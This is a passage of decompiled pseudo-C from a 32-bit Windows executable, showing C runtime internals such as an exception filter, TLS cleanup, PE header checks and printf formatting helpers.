    v6[0] = a1;
    v9 = a5;
    v6[1] = a2;
    return (int (__cdecl *)(_DWORD))dword_7B2080(v6);
  }
  return result;
}


// ----- sub_404400 @ 0x404400 -----
void __cdecl sub_404400(_UserMathErrorFunctionPointer UserMathErrorFunction)
{
  dword_7B2080 = (int (__cdecl *)(_DWORD))UserMathErrorFunction;
  _setusermatherr(UserMathErrorFunction);
}


// ----- TopLevelExceptionFilter @ 0x404420 -----
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  DWORD ExceptionCode; // eax
  _crt_signal_t v2; // eax
  _crt_signal_t v4; // eax
  _crt_signal_t v5; // eax

  ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
  if ( ExceptionCode == -1073741677 )
  {
LABEL_17:
    v5 = signal(8, nullptr);
    if ( v5 == (_crt_signal_t)1 )
    {
      signal(8, (_crt_signal_t)1);
      sub_404860();
      return -1;
    }
    goto LABEL_18;
  }
  if ( ExceptionCode > 0xC0000093 )
  {
    if ( ExceptionCode == -1073741676 )
    {
      v5 = signal(8, nullptr);
      if ( v5 == (_crt_signal_t)1 )
      {
        signal(8, (_crt_signal_t)1);
        return -1;
      }
LABEL_18:
      if ( v5 != nullptr )
      {
        v5(8);
        return -1;
      }
      goto LABEL_8;
    }
    if ( ExceptionCode != -1073741674 )
      goto LABEL_8;
  }
  else if ( ExceptionCode != -1073741795 )
  {
    if ( ExceptionCode <= 0xC000001D )
    {
      if ( ExceptionCode != -1073741819 )
        goto LABEL_8;
      v2 = signal(11, nullptr);
      if ( v2 == (_crt_signal_t)1 )
      {
        signal(11, (_crt_signal_t)1);
      }
      else
      {
        if ( v2 == nullptr )
          goto LABEL_8;
        v2(11);
      }
      return -1;
    }
    if ( ExceptionCode + 1073741683 <= 4 )
      goto LABEL_17;
LABEL_8:
    if ( dword_7B2088 != nullptr )
      return dword_7B2088(ExceptionInfo);
    else
      return 0;
  }
  v4 = signal(4, nullptr);
  if ( v4 == (_crt_signal_t)1 )
  {
    signal(4, (_crt_signal_t)1);
    return -1;
  }
  if ( v4 != nullptr )
  {
    v4(4);
    return -1;
  }
  goto LABEL_8;
}


// ----- sub_4045C0 @ 0x4045c0 -----
void sub_4045C0()
{
  DWORD *v0; // ebx
  LPVOID Value; // esi
  DWORD LastError; // eax

  EnterCriticalSection(&CriticalSection);
  v0 = (DWORD *)Block;
  if ( Block != nullptr )
  {
    do
    {
      Value = TlsGetValue(*v0);
      LastError = GetLastError();
      if ( Value != nullptr && LastError == 0 )
        ((void (__cdecl *)(LPVOID))v0[1])(Value);
      v0 = (DWORD *)v0[2];
    }
    while ( v0 != nullptr );
  }
  LeaveCriticalSection(&CriticalSection);
}


// ----- sub_404750 @ 0x404750 -----
int __cdecl sub_404750(int a1, unsigned int a2)
{
  _DWORD *Block; // eax
  _DWORD *v4; // [esp+1Ch] [ebp-Ch]

  if ( a2 == 2 )
  {
    sub_404860();
    return 1;
  }
  else
  {
    if ( a2 > 2 )
    {
      if ( a2 == 3 && dword_7B2090 != 0 )
        sub_4045C0();
    }
    else if ( a2 != 0 )
    {
      if ( dword_7B2090 == 0 )
        InitializeCriticalSection(&CriticalSection);
      dword_7B2090 = 1;
    }
    else
    {
      if ( dword_7B2090 != 0 )
        sub_4045C0();
      if ( dword_7B2090 == 1 )
      {
        Block = ::Block;
        if ( ::Block != nullptr )
        {
          do
          {
            v4 = (_DWORD *)Block[2];
            free(Block);
            Block = v4;
          }
          while ( v4 != nullptr );
        }
        ::Block = nullptr;
        dword_7B2090 = 0;
        DeleteCriticalSection(&CriticalSection);
      }
    }
    return 1;
  }
}


// ----- sub_404860 @ 0x404860 -----
void sub_404860()
{
  __asm { fninit }
}


// ----- sub_404870 @ 0x404870 -----
BOOL __cdecl sub_404870(int a1)
{
  int v1; // eax

  return *(_WORD *)a1 == 23117 && *(_DWORD *)(v1 = *(_DWORD *)(a1 + 60) + a1) == 17744 && *(_WORD *)(v1 + 24) == 267;
}


// ----- sub_404990 @ 0x404990 -----
int __cdecl sub_404990(int a1)
{
  int result; // eax
  int v2; // esi
  int v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // edx

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    v2 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
    if ( (_WORD)v2 != 0 )
    {
      v3 = 0;
      v4 = a1 - 0x400000;
      for ( result = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328; ; result += 40 )
      {
        v5 = *(_DWORD *)(result + 12);
        if ( v4 >= v5 && v4 < *(_DWORD *)(result + 8) + v5 )
          break;
        if ( v2 == ++v3 )
          return 0;
      }
    }
  }
  return result;
}


// ----- sub_404A10 @ 0x404a10 -----
int sub_404A10()
{
  int result; // eax

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    return *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
  }
  return result;
}


// ----- sub_404A50 @ 0x404a50 -----
int __cdecl sub_404A50(int a1)
{
  int result; // eax
  int v3; // ebx
  int i; // edx

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    v3 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
    if ( (_WORD)v3 != 0 )
    {
      result = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328;
      for ( i = 0; i != v3; ++i )
      {
        if ( (*(_BYTE *)(result + 39) & 0x20) != 0 )
        {
          if ( a1 == 0 )
            return result;
          --a1;
        }
        result += 40;
      }
      return 0;
    }
  }
  return result;
}


// ----- sub_404AD0 @ 0x404ad0 -----
int sub_404AD0()
{
  int result; // eax

  result = 0;
  if ( MEMORY[0x400000] == 23117
    && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744
    && *(_WORD *)(MEMORY[0x40003C] + 4194328) == 267 )
  {
    return 0x400000;
  }
  return result;
}


// ----- sub_404BA0 @ 0x404ba0 -----
int __cdecl sub_404BA0(int a1)
{
  unsigned int v3; // eax
  int v4; // edi
  int v5; // esi
  int i; // edx
  unsigned int v7; // ecx
  unsigned int j; // eax

  if ( MEMORY[0x400000] != 23117 )
    return 0;
  if ( *(_DWORD *)(MEMORY[0x40003C] + 0x400000) != 17744 )
    return 0;
  if ( *(_WORD *)(MEMORY[0x40003C] + 4194328) != 267 )
    return 0;
  v3 = *(_DWORD *)(MEMORY[0x40003C] + 4194432);
  if ( v3 == 0 )
    return 0;
  v4 = *(unsigned __int16 *)(MEMORY[0x40003C] + 4194310);
  if ( (_WORD)v4 == 0 )
    return 0;
  v5 = 0;
  for ( i = MEMORY[0x40003C] + *(unsigned __int16 *)(MEMORY[0x40003C] + 4194324) + 4194328; ; i += 40 )
  {
    v7 = *(_DWORD *)(i + 12);
    if ( v3 >= v7 && v3 < *(_DWORD *)(i + 8) + v7 )
      break;
    if ( v4 == ++v5 )
      return 0;
  }
  for ( j = v3 + 0x400000; *(_DWORD *)(j + 4) != 0 || *(_DWORD *)(j + 12) != 0; j += 20 )
  {
    if ( a1 <= 0 )
      return *(_DWORD *)(j + 12) + 0x400000;
    --a1;
  }
  return 0;
}


// ----- sub_404C70 @ 0x404c70 -----
unsigned int __usercall sub_404C70@<eax>(unsigned int a1@<eax>, int a2@<ecx>, char a3)
{
  char *v3; // ecx
  unsigned int v5; // [esp-8h] [ebp-8h]
  int v6; // [esp-4h] [ebp-4h]

  v6 = a2;
  v5 = a1;
  v3 = &a3;
  if ( a1 >= 0x1000 )
  {
    do
    {
      v3 -= 4096;
      *(_DWORD *)v3 = *(_DWORD *)v3;
      a1 -= 4096;
    }
    while ( a1 > 0x1000 );
  }
  *(_DWORD *)&v3[-a1] = *(_DWORD *)&v3[-a1];
  return v5;
}


// ----- sub_404CA0 @ 0x404ca0 -----
int sub_404CA0(int a1, int a2, const char *a3, ...)
{
  va_list va; // [esp+2Ch] [ebp+14h] BYREF

  va_start(va, a3);
  return sub_404CD0(a1, a2, a3, va);
}


// ----- sub_404CD0 @ 0x404cd0 -----
int __cdecl sub_404CD0(int a1, int a2, int a3, int a4)
{
  int v4; // ebx
  int result; // eax

  if ( a2 == 0 )
    return sub_406C40(0, a1, 0, a3, a4);
  v4 = a2 - 1;
  result = sub_406C40(0, a1, a2 - 1, a3, a4);
  if ( a2 - 1 > result )
    v4 = result;
  *(_BYTE *)(a1 + v4) = 0;
  return result;
}


// ----- sub_404D80 @ 0x404d80 -----
int __usercall sub_404D80@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, _TBYTE a4, int *a5)
{
  char v7; // c2
  char v8; // c3
  char v9; // c0
  int v10; // esi
  __int16 v11; // di
  int v12; // eax
  int v13; // edi
  __int16 v15; // [esp+28h] [ebp-50h]
  __int16 v16; // [esp+38h] [ebp-40h]
  int v17; // [esp+48h] [ebp-30h] BYREF
  _BYTE v18[4]; // [esp+4Ch] [ebp-2Ch] BYREF
  _TBYTE v19[4]; // [esp+50h] [ebp-28h] BYREF

  *(double *)v19 = *(double *)&a4;
  __asm { fxam }
  if ( v9 != 0 )
  {
    if ( v7 == 0 )
    {
      v17 = 4;
      v12 = 0;
      v13 = 0;
      goto LABEL_7;
    }
    v10 = 3;
    v11 = v16;
    v12 = 0;
  }
  else
  {
    v11 = v15;
    if ( v7 != 0 )
    {
      if ( v8 != 0 )
      {
        v10 = 2;
        v12 = -16445;
      }
      else
      {
        v10 = 1;
        v12 = (__int16)((v15 & 0x7FFF) - 16446);
      }
    }
    else
    {
      v10 = 0;
      v12 = 0;
    }
  }
  v17 = v10;
  v13 = v11 & 0x8000;
LABEL_7:
  *a5 = v13;
  return sub_407B00(&unk_7AC098, v12, v19, &v17, a1, a2, a3, v18);
}


// ----- sub_404E70 @ 0x404e70 -----
int __usercall sub_404E70@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // ecx
  int v4; // eax
  FILE *Stream; // eax
  int result; // eax

  v3 = *(_DWORD *)(a2 + 4);
  if ( (v3 & 0x4000) == 0 )
  {
    v4 = *(_DWORD *)(a2 + 32);
    if ( *(_DWORD *)(a2 + 36) <= v4 )
      goto LABEL_5;
  }
  Stream = *(FILE **)a2;
  if ( (v3 & 0x2000) == 0 )
  {
    *((_BYTE *)&Stream->_ptr + *(_DWORD *)(a2 + 32)) = a1;
    v4 = *(_DWORD *)(a2 + 32);
LABEL_5:
    result = v4 + 1;
    *(_DWORD *)(a2 + 32) = result;
    return result;
  }
  fputc(a1, Stream);
  result = *(_DWORD *)(a2 + 32) + 1;
  *(_DWORD *)(a2 + 32) = result;
  return result;
}


// ----- sub_404ED0 @ 0x404ed0 -----
int __usercall sub_404ED0@<eax>(unsigned __int16 *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // eax
  int v6; // esi
  bool v7; // sf
  int v8; // eax
  int result; // eax
  int v10; // eax
  _BYTE *v11; // esi
  _BYTE *v12; // edi
  int v13; // eax
  int v14; // edx
  int Character; // eax
  int v16; // eax
  int v17; // eax
  int v19; // [esp+1Ch] [ebp-3Ch]
  _BYTE v20[40]; // [esp+30h] [ebp-28h] BYREF

  sub_40A420(v20, 0);
  v5 = *(_DWORD *)(a3 + 12);
  v6 = v5;
  if ( a2 <= v5 )
    v6 = a2;
  v7 = v5 < 0;
  v8 = *(_DWORD *)(a3 + 8);
  if ( v7 )
    v6 = a2;
  if ( v8 > v6 )
  {
    v16 = v8 - v6;
    *(_DWORD *)(a3 + 8) = v16;
    if ( (*(_BYTE *)(a3 + 5) & 4) != 0 )
    {
      if ( v6 <= 0 )
      {
        --*(_DWORD *)(a3 + 8);
        goto LABEL_18;
      }
    }
    else
    {
      *(_DWORD *)(a3 + 8) = v16 - 1;
      do
      {
        sub_404E70(32, a3);
        v17 = *(_DWORD *)(a3 + 8);
        *(_DWORD *)(a3 + 8) = v17 - 1;
      }
      while ( v17 != 0 );
      if ( v6 <= 0 )
        goto LABEL_19;
    }
    v19 = v6 - 1;
LABEL_7:
    v10 = sub_40A420(v20, *a1);
    if ( v10 <= 0 )
    {
LABEL_19:
      while ( 1 )
      {
        result = *(_DWORD *)(a3 + 8);
        *(_DWORD *)(a3 + 8) = result - 1;
        if ( result <= 0 )
          break;
LABEL_18:
        sub_404E70(32, a3);
      }
      return result;
    }
    v11 = v20;
    ++a1;
    v12 = &v20[v10];
    while ( 1 )
    {
      v14 = *(_DWORD *)(a3 + 4);
      ++v11;
      if ( (v14 & 0x4000) == 0 )
      {
        v13 = *(_DWORD *)(a3 + 32);
        if ( *(_DWORD *)(a3 + 36) <= v13 )
          goto LABEL_10;
      }
      Character = (char)*(v11 - 1);
      if ( (v14 & 0x2000) != 0 )
      {
        fputc(Character, *(FILE **)a3);
        ++*(_DWORD *)(a3 + 32);
        if ( v11 == v12 )
        {
LABEL_15:
          if ( v19 != 0 )
          {
            --v19;
            goto LABEL_7;
          }
          goto LABEL_19;
        }
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)a3 + *(_DWORD *)(a3 + 32)) = Character;
        v13 = *(_DWORD *)(a3 + 32);
LABEL_10:
        *(_DWORD *)(a3 + 32) = v13 + 1;
        if ( v11 == v12 )
          goto LABEL_15;
      }
    }
  }
  result = v6 - 1;
  *(_DWORD *)(a3 + 8) = -1;
  v19 = v6 - 1;
  if ( v6 > 0 )
    goto LABEL_7;
  *(_DWORD *)(a3 + 8) = -2;
  return result;
}


// ----- sub_405050 @ 0x405050 -----
int __usercall sub_405050@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // eax
  int v6; // edi
  bool v7; // sf
  int result; // eax
  int v9; // eax
  int v10; // edi
  int v11; // edx
  FILE *Stream; // ecx
  int v13; // eax
  int v14; // edx
  int v15; // eax
  int v16; // edx
  int v17; // [esp+1Ch] [ebp-1Ch]

  v5 = *(_DWORD *)(a3 + 12);
  v6 = v5;
  if ( a2 <= v5 )
    v6 = a2;
  v7 = v5 < 0;
  result = *(_DWORD *)(a3 + 8);
  if ( v7 )
    v6 = a2;
  if ( result > v6 )
  {
    v13 = result - v6;
    *(_DWORD *)(a3 + 8) = v13;
    v14 = v13;
    v9 = *(_DWORD *)(a3 + 4);
    if ( (v9 & 0x400) != 0 )
    {
      if ( v6 == 0 )
      {
        --*(_DWORD *)(a3 + 8);
        goto LABEL_26;
      }
    }
    else
    {
      *(_DWORD *)(a3 + 8) = v14 - 1;
      do
      {
        sub_404E70(32, a3);
        v15 = *(_DWORD *)(a3 + 8);
        *(_DWORD *)(a3 + 8) = v15 - 1;
      }
      while ( v15 != 0 );
      if ( v6 == 0 )
        goto LABEL_24;
      v9 = *(_DWORD *)(a3 + 4);
    }
    v17 = v6 - 1;
  }
  else
  {
    *(_DWORD *)(a3 + 8) = -1;
    if ( v6 == 0 )
    {
      *(_DWORD *)(a3 + 8) = -2;
      return result;
    }
    v17 = v6 - 1;
    v9 = *(_DWORD *)(a3 + 4);
  }
  v10 = a1;
  while ( 1 )
  {
    ++v10;
    if ( (v9 & 0x4000) != 0 || (v11 = *(_DWORD *)(a3 + 32), *(_DWORD *)(a3 + 36) > v11) )
    {
      Stream = *(FILE **)a3;
      if ( (v9 & 0x2000) != 0 )
        fputc(*(char *)(v10 - 1), Stream);
      else
        *((_BYTE *)&Stream->_ptr + *(_DWORD *)(a3 + 32)) = *(_BYTE *)(v10 - 1);
      v11 = *(_DWORD *)(a3 + 32);
    }
    *(_DWORD *)(a3 + 32) = v11 + 1;
    if ( v17 + a1 + 1 - v10 == 0 )
      break;
    v9 = *(_DWORD *)(a3 + 4);
  }
LABEL_24:
  while ( 1 )
  {
    result = *(_DWORD *)(a3 + 8);
    *(_DWORD *)(a3 + 8) = result - 1;
    if ( result <= 0 )
      break;
    v9 = *(_DWORD *)(a3 + 4);
LABEL_26:
    if ( (v9 & 0x4000) != 0 || (v16 = *(_DWORD *)(a3 + 32), *(_DWORD *)(a3 + 36) > v16) )
    {
      if ( (v9 & 0x2000) != 0 )
        fputc(32, *(FILE **)a3);
      else
        *(_BYTE *)(*(_DWORD *)a3 + *(_DWORD *)(a3 + 32)) = 32;
      v16 = *(_DWORD *)(a3 + 32);
    }
    *(_DWORD *)(a3 + 32) = v16 + 1;
  }
  return result;
}


// ----- sub_4051A0 @ 0x4051a0 -----
int __usercall sub_4051A0@<eax>(const char *a1@<eax>, int a2@<edx>)
{
  const char *Str; // ebx
  size_t v4; // eax

  Str = "(null)";
  if ( a1 != nullptr )
    Str = a1;
  if ( *(int *)(a2 + 12) < 0 )
    v4 = strlen(Str);
  else
    v4 = sub_40A5A0(Str, *(_DWORD *)(a2 + 12));
  return sub_405050((int)Str, v4, a2);
}


// ----- sub_4051F0 @ 0x4051f0 -----
int __usercall sub_4051F0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // ebx
  char v6; // al
  char *v7; // edx
  char v8; // bl
  int i; // ecx
  char v11; // [esp+1Ch] [ebp-1Ch] BYREF
  char v12; // [esp+1Dh] [ebp-1Bh] BYREF

  *(_DWORD *)(a3 + 12) = -1;
  v5 = *(_DWORD *)(a3 + 4);
  if ( a1 != 0 )
  {
    v6 = 45;
  }
  else if ( (v5 & 0x100) != 0 )
  {
    v6 = 43;
  }
  else
  {
    if ( (v5 & 0x40) == 0 )
    {
      v7 = &v11;
      goto LABEL_4;
    }
    v6 = 32;
  }
  v11 = v6;
  v7 = &v12;
LABEL_4:
  v8 = v5 & 0x20;
  for ( i = 0; i != 3; ++i )
    v7[i] = v8 | *(_BYTE *)(a2 + i) & 0xDF;
  return sub_405050((int)&v11, v7 + 3 - &v11, a3);
}


// ----- sub_405280 @ 0x405280 -----
char *__usercall sub_405280@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4)
{
  int v4; // ebx
  int v5; // eax
  int v6; // esi
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  void *v10; // esp
  char v11; // dl
  char v12; // bl
  unsigned __int64 v13; // rdi
  char v14; // al
  int v15; // edx
  char v16; // cl
  unsigned int v17; // esi
  int v18; // ecx
  int v19; // edx
  char *result; // eax
  unsigned int v21; // eax
  int v22; // edi
  char *v23; // edi
  int v24; // eax
  int v25; // eax
  int v26; // edi
  int v27; // eax
  void *v28; // esp
  int v29; // edi
  int v30; // eax
  char *v31; // eax
  int v32; // eax
  int v33; // eax
  void *v34; // esp
  int v35; // eax
  int v36; // edi
  int v37; // edi
  int v38; // eax
  int v39; // edi
  int v41; // eax
  __int16 v42; // ax
  char *v43; // edx
  char v44; // di
  int v45; // eax
  int v46; // eax
  char v47; // al
  char v48; // al
  int v49; // eax
  int v50; // eax
  int v51; // edx
  char Character; // [esp+0h] [ebp-58h]
  int v53; // [esp+10h] [ebp-48h] BYREF
  int v54; // [esp+14h] [ebp-44h]
  int v55; // [esp+18h] [ebp-40h]
  int v56; // [esp+1Ch] [ebp-3Ch]
  int v57; // [esp+20h] [ebp-38h]
  int v58; // [esp+24h] [ebp-34h]
  unsigned __int64 v59; // [esp+28h] [ebp-30h]
  char *v60; // [esp+30h] [ebp-28h]
  char v61; // [esp+37h] [ebp-21h]
  int v62; // [esp+38h] [ebp-20h]
  int v63; // [esp+3Ch] [ebp-1Ch]

  v58 = a1;
  v4 = a4;
  v59 = __PAIR64__(a3, a2);
  if ( a1 == 111 )
  {
    v32 = 0;
    v56 = *(_DWORD *)(a4 + 12);
    if ( v56 >= 0 )
      v32 = v56;
    v6 = v32 + 24;
    v57 = *(_DWORD *)(a4 + 4);
    v7 = v57;
    if ( (v57 & 0x1000) != 0 )
    {
      if ( *(_WORD *)(a4 + 28) != 0 )
      {
        v62 = 3;
        goto LABEL_37;
      }
      v33 = v32 + 24;
      v55 = *(_DWORD *)(a4 + 8);
      if ( v6 < v55 )
        v33 = v55;
    }
    else
    {
      v33 = v32 + 24;
      v55 = *(_DWORD *)(a4 + 8);
      if ( v55 >= v6 )
        v33 = v55;
    }
    v34 = alloca(sub_404C70(16 * ((unsigned int)(v33 + 27) >> 4), v57, Character));
    v62 = 3;
    v60 = (char *)&v53;
    goto LABEL_57;
  }
  v5 = 0;
  v56 = *(_DWORD *)(a4 + 12);
  if ( v56 >= 0 )
    v5 = v56;
  v6 = v5 + 18;
  v57 = *(_DWORD *)(a4 + 4);
  v7 = v57;
  if ( (v57 & 0x1000) == 0 || *(_WORD *)(a4 + 28) == 0 )
  {
    v8 = v5 + 18;
    v55 = *(_DWORD *)(a4 + 8);
    if ( v55 >= v6 )
      v8 = v55;
    v10 = alloca(sub_404C70(16 * ((unsigned int)(v8 + 27) >> 4), v57, Character));
    v62 = 4;
    v60 = (char *)&v53;
    goto LABEL_8;
  }
  v62 = 4;
LABEL_37:
  v26 = *(_DWORD *)(a4 + 8);
  v55 = v26;
  v27 = v6 + v6 / 3u;
  if ( v27 < v26 )
    v27 = v26;
  v28 = alloca(sub_404C70(16 * ((unsigned int)(v27 + 27) >> 4), v7, Character));
  v60 = (char *)&v53;
  if ( v58 == 111 )
  {
LABEL_57:
    v11 = 7;
    if ( v59 == 0 )
    {
      v35 = v57;
      v36 = v56;
      v17 = (unsigned int)v60;
      BYTE1(v35) = BYTE1(v57) & 0xF7;
      *(_DWORD *)(a4 + 4) = v35;
      result = (char *)v36;
      if ( v36 <= 0 )
      {
LABEL_59:
        if ( v56 != 0 )
          goto LABEL_60;
LABEL_47:
        result = (char *)(v17 - (_DWORD)v60);
        if ( (int)(v17 - (_DWORD)v60) < v55 )
          goto LABEL_61;
LABEL_48:
        *(_DWORD *)(v4 + 8) = -1;
        if ( v58 == 111 )
          goto LABEL_49;
        v57 = *(_DWORD *)(v4 + 4);
LABEL_97:
        if ( (v57 & 0x800) == 0 )
          goto LABEL_66;
        v48 = v58;
        *(_BYTE *)(v17 + 1) = 48;
        v63 = -1;
        *(_BYTE *)v17 = v48;
        result = (char *)(v17 + 2);
LABEL_90:
        if ( v60 < result )
        {
          BYTE1(v18) = BYTE1(v57);
          v17 = (unsigned int)result;
          v62 = v63 - 1;
          v23 = v60;
          goto LABEL_29;
        }
        return result;
      }
      goto LABEL_43;
    }
    goto LABEL_9;
  }
LABEL_8:
  v11 = 15;
  if ( v59 == 0 )
  {
    v51 = v57;
    v17 = (unsigned int)v60;
    BYTE1(v51) = BYTE1(v57) & 0xF7;
    result = (char *)v56;
    *(_DWORD *)(a4 + 4) = v51;
    if ( (int)result > 0 )
      goto LABEL_43;
    if ( result != nullptr )
      goto LABEL_60;
    if ( v55 <= 0 )
    {
      *(_DWORD *)(a4 + 8) = -1;
      v57 = v51;
      goto LABEL_97;
    }
    goto LABEL_102;
  }
LABEL_9:
  v54 = v9;
  v61 = v11;
  v63 = (int)v60;
  v12 = v58 & 0x20;
  v13 = __PAIR64__(v59, HIDWORD(v59));
  do
  {
    LODWORD(v59) = v63;
    v14 = v12 | ((v61 & BYTE4(v13)) + 55);
    v15 = v63 + 1;
    if ( (unsigned __int8)((v61 & BYTE4(v13)) + 48) <= 0x39u )
      v14 = (v61 & BYTE4(v13)) + 48;
    v16 = v62;
    ++v63;
    HIDWORD(v13) = __PAIR64__(v13, HIDWORD(v13)) >> v62;
    *(_BYTE *)(v15 - 1) = v14;
    LODWORD(v13) = (unsigned int)v13 >> v16;
    if ( (v16 & 0x20) != 0 )
    {
      HIDWORD(v13) = v13;
      LODWORD(v13) = 0;
    }
  }
  while ( v13 != 0 );
  v17 = v63;
  BYTE1(v18) = BYTE1(v54);
  v4 = a4;
  if ( (char *)v63 == v60 )
  {
    v30 = v57;
    v29 = v56;
    BYTE1(v30) = BYTE1(v57) & 0xF7;
    *(_DWORD *)(a4 + 4) = v30;
    if ( v29 > 0 )
    {
      result = (char *)v29;
      goto LABEL_43;
    }
    if ( v58 == 111 )
    {
      result = (char *)v56;
      if ( v56 != 0 )
        goto LABEL_60;
      if ( v55 <= 0 )
        goto LABEL_117;
    }
    else
    {
      if ( v56 != 0 )
        goto LABEL_60;
      if ( v55 <= 0 )
      {
        *(_DWORD *)(a4 + 8) = -1;
        v57 = v30;
        goto LABEL_97;
      }
    }
LABEL_102:
    result = nullptr;
LABEL_61:
    v37 = v55 - (_DWORD)result;
    v38 = *(_DWORD *)(v4 + 4);
    v63 = v37;
    *(_DWORD *)(v4 + 8) = v37;
    BYTE1(v18) = BYTE1(v38);
    v57 = v38;
    if ( v58 == 111 )
    {
LABEL_62:
      if ( v56 >= 0 )
        goto LABEL_63;
      v42 = v57;
LABEL_73:
      if ( (v42 & 0x600) == 0x200 )
      {
LABEL_74:
        v43 = (char *)v17;
        result = (char *)(v17 + v63);
        if ( (v63 & 1) == 0 || (v43 = (char *)(v17 + 1), *(_BYTE *)v17 = 48, (char *)(v17 + 1) != result) )
        {
          do
          {
            *v43 = 48;
            v43 += 2;
            *(v43 - 1) = 48;
          }
          while ( v43 != result );
        }
        v44 = v58;
        if ( v58 == 111 || (v57 & 0x800) == 0 )
        {
          v63 = -1;
        }
        else
        {
          result[1] = 48;
          *result = v44;
          v45 = v63;
          v63 = -1;
          result = (char *)(v17 + v45 + 2);
        }
        goto LABEL_90;
      }
LABEL_63:
      if ( (v57 & 0x400) == 0 )
      {
LABEL_64:
        v39 = v63 - 1;
        do
          sub_404E70(32, v4);
        while ( v39-- != 0 );
LABEL_66:
        result = v60;
        if ( (unsigned int)v60 < v17 )
        {
          v63 = -1;
          v18 = *(_DWORD *)(v4 + 4);
          v23 = v60;
          v62 = -2;
          goto LABEL_29;
        }
        return result;
      }
LABEL_24:
      v22 = v63 - 1;
      if ( (unsigned int)v60 < v17 )
      {
        v62 = v63 - 1;
        v23 = v60;
        while ( 1 )
        {
LABEL_29:
          --v17;
          if ( (v18 & 0x4000) == 0 )
          {
            v24 = *(_DWORD *)(v4 + 32);
            if ( *(_DWORD *)(v4 + 36) <= v24 )
              goto LABEL_27;
          }
          v25 = *(char *)v17;
          if ( (v18 & 0x2000) == 0 )
            break;
          fputc(v25, *(FILE **)v4);
          ++*(_DWORD *)(v4 + 32);
          if ( (unsigned int)v23 >= v17 )
          {
LABEL_33:
            result = (char *)v63;
            v22 = v62;
            if ( v63 > 0 )
            {
              v18 = *(_DWORD *)(v4 + 4);
              goto LABEL_83;
            }
            return result;
          }
LABEL_28:
          v18 = *(_DWORD *)(v4 + 4);
        }
        *(_BYTE *)(*(_DWORD *)v4 + *(_DWORD *)(v4 + 32)) = v25;
        v24 = *(_DWORD *)(v4 + 32);
LABEL_27:
        *(_DWORD *)(v4 + 32) = v24 + 1;
        if ( (unsigned int)v23 >= v17 )
          goto LABEL_33;
        goto LABEL_28;
      }
      while ( 1 )
      {
LABEL_83:
        if ( (v18 & 0x4000) == 0 )
        {
          v46 = *(_DWORD *)(v4 + 32);
          if ( *(_DWORD *)(v4 + 36) <= v46 )
            goto LABEL_81;
        }
        if ( (v18 & 0x2000) == 0 )
          break;
        fputc(32, *(FILE **)v4);
        result = (char *)(*(_DWORD *)(v4 + 32) + 1);
        *(_DWORD *)(v4 + 32) = result;
        if ( v22 == 0 )
          return result;
LABEL_82:
        v18 = *(_DWORD *)(v4 + 4);
        --v22;
      }
      *(_BYTE *)(*(_DWORD *)v4 + *(_DWORD *)(v4 + 32)) = 32;
      v46 = *(_DWORD *)(v4 + 32);
LABEL_81:
      result = (char *)(v46 + 1);
      *(_DWORD *)(v4 + 32) = result;
      if ( v22 == 0 )
        return result;
      goto LABEL_82;
    }
    goto LABEL_71;
  }
  if ( v56 > 0 )
  {
    v19 = v63 - (_DWORD)v60;
    result = (char *)(v56 - (v63 - (_DWORD)v60));
    if ( (int)result <= 0 )
    {
      if ( v58 != 111 )
      {
        if ( v19 < v55 )
        {
          v63 = v55 - v19;
          *(_DWORD *)(a4 + 8) = v55 - v19;
          if ( (v57 & 0x800) == 0 )
            goto LABEL_63;
          v63 -= 2;
          if ( v63 <= 0 )
            goto LABEL_89;
          v21 = v17;
          goto LABEL_23;
        }
LABEL_112:
        *(_DWORD *)(a4 + 8) = -1;
        goto LABEL_97;
      }
      if ( (v57 & 0x800) != 0 )
      {
        v49 = v59;
        *(_BYTE *)v63 = 48;
        v17 = v49 + 2;
        if ( v60 != (char *)(v49 + 2) )
          goto LABEL_47;
        v17 = (unsigned int)v60;
        goto LABEL_60;
      }
      if ( v19 < v55 )
      {
        BYTE1(v18) = BYTE1(v57);
        v63 = v55 - v19;
        *(_DWORD *)(a4 + 8) = v55 - v19;
        goto LABEL_62;
      }
      goto LABEL_117;
    }
LABEL_43:
    v31 = &result[v17];
    if ( (((_BYTE)v31 - (_BYTE)v17) & 1) == 0 || (++v17, *(_BYTE *)(v17 - 1) = 48, (char *)v17 != v31) )
    {
      do
      {
        *(_BYTE *)v17 = 48;
        v17 += 2;
        *(_BYTE *)(v17 - 1) = 48;
      }
      while ( (char *)v17 != v31 );
    }
    v17 = (unsigned int)v31;
    if ( v31 != v60 )
      goto LABEL_47;
LABEL_60:
    *(_BYTE *)v17++ = 48;
    result = (char *)(v17 - (_DWORD)v60);
    if ( (int)(v17 - (_DWORD)v60) < v55 )
      goto LABEL_61;
    goto LABEL_48;
  }
  if ( v58 != 111 )
  {
    v41 = v63 - (_DWORD)v60;
    if ( v63 - (int)v60 < v55 )
    {
      BYTE1(v18) = BYTE1(v57);
      v63 = v55 - v41;
